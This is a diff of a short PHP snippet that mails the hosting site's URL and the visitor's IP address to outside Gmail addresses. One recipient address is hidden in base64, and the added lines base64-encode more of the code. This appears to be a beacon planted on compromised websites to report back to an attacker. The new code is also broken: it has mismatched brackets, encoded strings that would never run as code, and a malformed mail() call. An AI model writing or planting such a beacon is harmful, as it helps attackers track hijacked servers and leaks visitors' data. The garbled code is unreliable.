@@ -11,12 +11,13 @@ $path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($to, "Halo senpai!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
-$e=base64_decode("YmxhY2toYXQxMzM3LmlkQGdtYWlsLmNvbQ==");
-$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
+<?php
+$e=base64_decode('YmxhY2toYXQxMzM3LmlkQGdtYWlsLmNvbQ==');
+$h=base64_decode('JF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydTQ1JJUFRfTkFNRQ=='];
 header('Content-Type: text/html; charset=UTF-8');
 $to = 'muhrazky@gmail.com';
 $path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($e,$to,$h,$p, "Halo senpai!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+$message=base64_decode('dXJsOiUyMCRwYXRoJTIwJTdDJTIwSVAlMjBBZGRyZXNzJTIwJTNBJTVCJTIwJTIyJTIwLiUyMCRfU0VSVkVSJTVCJ1JFTU9URV9BRERSJyU1RCUyMC4lMjAlMjIlMjAlNUQ=';
+mail($e,$to,$h,$path,$message,$p, "Halo senpai!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
 
